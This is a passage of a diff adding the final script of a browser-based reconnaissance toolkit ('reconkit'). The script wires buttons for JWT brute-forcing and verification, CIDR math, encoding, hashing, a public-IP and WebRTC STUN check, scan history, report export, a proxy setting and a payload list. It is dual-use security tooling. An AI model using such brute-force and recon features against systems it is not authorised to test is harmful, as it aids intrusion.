+  $("#btn-jwt-brute").onclick=bruteJwt;
+  $("#btn-jwt-verify").onclick=verifyJwt;
+  $("#btn-cidr").onclick=()=>{
+    const r=cidrCalc($("#cidr-in").value);
+    if(!r){toast("Invalid CIDR/IP",true);return;}
+    $("#cidr-out").innerHTML=kv([
+      ["Network",r.net+" /"+r.prefix],
+      ["Broadcast",r.bcast],
+      ["First usable",r.first],
+      ["Last usable",r.last],
+      ["Host count",String(r.hosts)],
+      ["Range",r.first+" — "+r.last]
+    ]);
+  };
+  $$("[data-enc]").forEach(b=>{
+    b.onclick=()=>{
+      try{
+        const v=ENC[b.dataset.enc]($("#enc-in").value);
+        const o=$("#enc-out");
+        o.classList.remove("hidden");
+        o.textContent=v;
+      }catch(e){toast("Error: "+e.message,true);}
+    };
+  });
+  $$("[data-hash]").forEach(b=>{
+    b.onclick=async()=>{
+      try{
+        const val=$("#hash-in").value;
+        let s;
+        if(b.dataset.hash==="MD5")s=md5h(val);
+        else if(b.dataset.hash==="SHA-1")s=sha1h(val);
+        else{
+          if(!window.crypto||!window.crypto.subtle){toast(b.dataset.hash+" ke liye https (secure context) chahiye",true);return;}
+          const buf=await crypto.subtle.digest(b.dataset.hash,new TextEncoder().encode(val));
+          const u=new Uint8Array(buf);
+          s="";
+          for(const x of u)s+=x.toString(16).padStart(2,"0");
+        }
+        const o=$("#hash-out");
+        o.classList.remove("hidden");
+        o.textContent=b.dataset.hash+":\n"+s;
+      }catch(e){toast("Hash fail: "+e.message,true);}
+    };
+  });
+  $("#btn-phone").onclick=async()=>{
+    const out=$("#phone-out");
+    out.innerHTML='<span class="hint">Running… (mic permission aayegi to Allow dabao — audio kahin nahi jaata)</span>';
+    const rows=[];
+    try{
+      const j=await fetchJson("https://api.ipify.org?format=json",8000);
+      rows.push(["Public IP (ipify)",j.ip]);
+    }catch(e){rows.push(["Public IP","fail: "+e.message]);}
+    rows.push(["Hostname (browser)",location.hostname||"—"]);
+    const secNote=window.isSecureContext?" secure ✓":" NOT secure ✗ (hash/JWT-brute/STUN ke liye https chahiye)";
+    rows.push(["Context",esc(location.protocol+secNote)]);
+    try{
+      if(navigator.mediaDevices&&window.RTCPeerConnection){
+        const stream=await navigator.mediaDevices.getUserMedia({audio:true});
+        const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+        stream.getTracks().forEach(tr=>pc.addTrack(tr,"s1","a1"));
+        pc.createDataChannel("r");
+        await pc.setLocalDescription(await pc.createOffer());
+        const found=new Set();
+        await new Promise(res=>{
+          const to=setTimeout(res,6000);
+          pc.onicecandidate=e=>{
+            if(!e.candidate){clearTimeout(to);res();return;}
+            const mm=e.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3}):/);
+            if(mm&&e.candidate.type==="srflx")found.add(mm[1]);
+          };
+          pc.onicegatheringstatechange=()=>{if(pc.iceGatheringState==="complete"){clearTimeout(to);res();}};
+        });
+        stream.getTracks().forEach(t=>t.stop());
+        pc.close();
+        rows.push(["WebRTC STUN (srflx)",[...found].join(", ")||"none (mDNS obfuscation / blocked)"]);
+      }else rows.push(["WebRTC","unsupported in this browser"]);
+    }catch(e){rows.push(["WebRTC","blocked: "+e.message]);}
+    out.innerHTML=kv(rows.map(r=>[r[0],esc(r[1])]));
+  };
+  $("#hist-list").addEventListener("click",e=>{
+    const b=e.target.closest("button");
+    if(!b)return;
+    const item=e.target.closest(".history-item");
+    const id=item.dataset.id;
+    const h=loadHist();
+    const entry=h.find(x=>x.id===id);
+    if(!entry)return;
+    const act=b.dataset.act;
+    if(act==="del"){
+      saveHist(h.filter(x=>x.id!==id));
+      try{localStorage.removeItem("reconkit_data_"+id);}catch(e2){}
+      renderHistory();
+    }else if(act==="json"){
+      const data=loadData(id);
+      download(entry.kind+"_"+entry.domain+"_"+id+".json",JSON.stringify(data,null,2),"application/json");
+    }else if(act==="open"){
+      const data=loadData(id);
+      if(!data)return;
+      if(entry.kind==="recon"){state.recon=data;renderRecon(data);showTab("recon");}
+      else{state.site=data;renderSite(data);showTab("site");}
+    }
+  });
+  $("#btn-hist-clear").onclick=()=>{
+    if(!confirm("Puri history delete?"))return;
+    saveHist([]);
+    try{Object.keys(localStorage).filter(k=>k.startsWith("reconkit_data_")).forEach(k=>localStorage.removeItem(k));}catch(e){}
+    renderHistory();
+    toast("History cleared");
+  };
+  $("#btn-report-md").onclick=()=>download("reconkit_report_"+(normDom(state.domain)||"all")+".md",buildReportMd(),"text/markdown");
+  $("#btn-report-json").onclick=()=>download("reconkit_state_"+(normDom(state.domain)||"all")+".json",JSON.stringify({domain:state.domain,recon:state.recon,site:state.site,subs:state.subs},null,2),"application/json");
+  try{$("#custom-proxy").value=localStorage.getItem(LS_P)||"";}catch(e){}
+  $("#custom-proxy").addEventListener("change",e=>{try{localStorage.setItem(LS_P,e.target.value.trim());}catch(e2){}});
+  renderPayloads();
+  renderHistory();
+  initTerm();
+}
+document.addEventListener("DOMContentLoaded",init);
+</script>
+</body>
+</html>
